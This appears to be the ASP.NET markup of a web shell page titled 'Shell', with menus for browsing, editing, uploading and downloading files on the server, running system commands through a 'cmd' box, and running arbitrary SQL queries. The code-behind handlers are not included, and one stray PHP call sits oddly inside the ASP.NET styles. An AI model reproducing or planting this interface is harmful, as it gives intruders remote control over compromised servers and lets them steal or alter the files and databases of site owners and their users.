<html>
<head>
	<title>Shell</title>
	<style>
		body { <asp:Literal runat="server" ID="css_body" /> text-align:left; padding:2px; font-size:12px; }
		table { <asp:Literal runat="server" ID="css_tbl" /> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
		th { font-size:13px; text-align:left; padding:2px; }
		td { font-size:12px; text-align:left; padding:2px; }
		table.fbrowser tr { <asp:Literal runat="server" ID="css_fb_tr" /> }
		table.fbrowser tr:hover { <asp:Literal runat="server" ID="css_fb_tr_hv" /> } 
		.sql { <asp:Literal runat="server" ID="css_sql_tbl" /> width:100%; padding:2px; font-size:12px; }
		.sql th { <asp:Literal runat="server" ID="css_sql_th" /> }
		.sql td { font-size:12px; text-align:left; padding:2px; } 
		.sql tr { <asp:Literal runat="server" ID="css_sql_tr" /> } 
		.sql tr:hover { <asp:Literal runat="server" ID="css_sql_tr_hv" /> <?php echo Colors("hover"); ?> }
		input { <asp:Literal runat="server" ID="css_inp" /> font-size:12px; padding:2px; } 
		form { padding:0px; }
		textarea { width:100%; height:100%; }
		div { padding:0px; }
		.sep { padding:2px; }
		a:link { <asp:Literal runat="server" ID="css_a_l" />  }
		a:visited { <asp:Literal runat="server" ID="css_a_v" />  }
		.menu { text-align:left; padding:2px; font-size:13px; }
		.menu a { <asp:Literal runat="server" ID="css_menu_a" /> text-decoration:none; }
	</style>
</head>
<body>
<div class="sep">
	<table>
		<tr><asp:Literal runat="server" ID="srv_info_1" /></tr>
		<tr><asp:Literal runat="server" ID="srv_info_2" /></tr>
	</table>
</div>
<div class="sep">
	<hr>
	<table class="menu"> 
		<tr>
			<th><a href="?act=fbrowser">FileBrowser</a></th>
			<th><a href="?act=feditor">FileEditor</a></th>
			<th><a href="?act=fuploader">FileUploader</a></th>
			<th><a href="?act=cmd">RunCmd</a></th>
			<th><a href="?act=sql">SqlQueries</a></th>
			<th><a href="?act=exit">Exit</a></th>
		</tr>
	</table>
	<hr>
</div>
<div class="sep" id="div_file_browser" runat="server" visible=false>
	<table class="fbrowser">
		<tr <asp:Literal runat="server" ID="css_fb_tr_1" /> >
			<th>CWD: <asp:Literal runat="server" ID="get_cwd" /></th>
			<th class="menu"><asp:Literal runat="server" ID="go_home" /></th>
			<th>Drives: <asp:Literal runat="server" ID="get_drve" /></th>
			<th></th>
			<th></th>
		</tr>
		<tr <asp:Literal runat="server" ID="css_fb_tr_2" /> >
			<th>Name</th><th>Size</th><th>Permissions</th><th>Created</th><th>Accessed</th><th>Modified</th>
		</tr>
		<asp:Literal runat="server" ID="file_browser" Mode="PassThrough" />
	</table>
</div>
<div class="sep">
<form id="main_form" runat="server" >
	<span id="div_file_editor" runat="server" visible=false>
		<asp:TextBox runat="server" ID="fedit_path" Width="400" />
		<asp:Button runat="server" ID="fedit_read" OnClick="FileEditor" Text="Read >>" />
		<asp:Button runat="server" ID="fedit_write" OnClick="FileEditor" Text="Write >>" />
		<asp:Button runat="server" ID="fedit_remove" OnClick="FileEditor" Text="RMove >>" />
		<asp:Button runat="server" ID="fedit_rename" OnClick="FileEditor" Text="RName >>" />
		<asp:Button runat="server" ID="fedit_mkdir" OnClick="FileEditor" Text="MkDir >>" />
		<asp:Button runat="server" ID="fedit_dnload" OnClick="FileEditor" Text="DnLoad >>" />
		&nbsp;&nbsp;&nbsp;<b><asp:Literal runat="server" ID="fedit_out" Mode="PassThrough" /></b>
		<pre><asp:TextBox id="fedit_text" TextMode="multiline" Columns="120" Rows="50" runat="server" /></pre>
	</span>
	<span id="div_file_uploader" runat="server" visible=false>
		<asp:TextBox runat="server" ID="fupl_path" Width="400" />
		<asp:FileUpload runat="server" ID="fupl_file" />
		<asp:Button runat="server" ID="fupl_sub" OnClick="FileUploader" Text=" >>" />
		&nbsp;&nbsp;&nbsp;<b><asp:Literal runat="server" ID="fupl_out" Mode="PassThrough" /></b>
	</span>
	<span id="div_run_cmd"  runat="server" visible=false>
		<asp:TextBox runat="server" ID="cmd_txt" Text="cmd" Width="500" />
		<asp:Button runat="server" ID="cmd_sub" OnClick="RunCmd" Text=" >>" />
		<pre><asp:Literal runat="server" ID="cmd_out" Mode="Encode" /></pre>
	</span>
	<span id="div_sql_queries" runat="server" visible=false>
		<asp:TextBox runat="server" ID="sql_con_str" Width="450" Value="Connection String" />
		<asp:TextBox runat="server" ID="sql_qry" Value="Query" Width="450" />
		<asp:Button runat="server" ID="sql_sub" OnClick="SqlManager" Text=" >>" />
		<div><asp:Literal runat="server" ID="sql_out" Text=""/></div>
	</span>
</form>
</div>
</body>
</html>
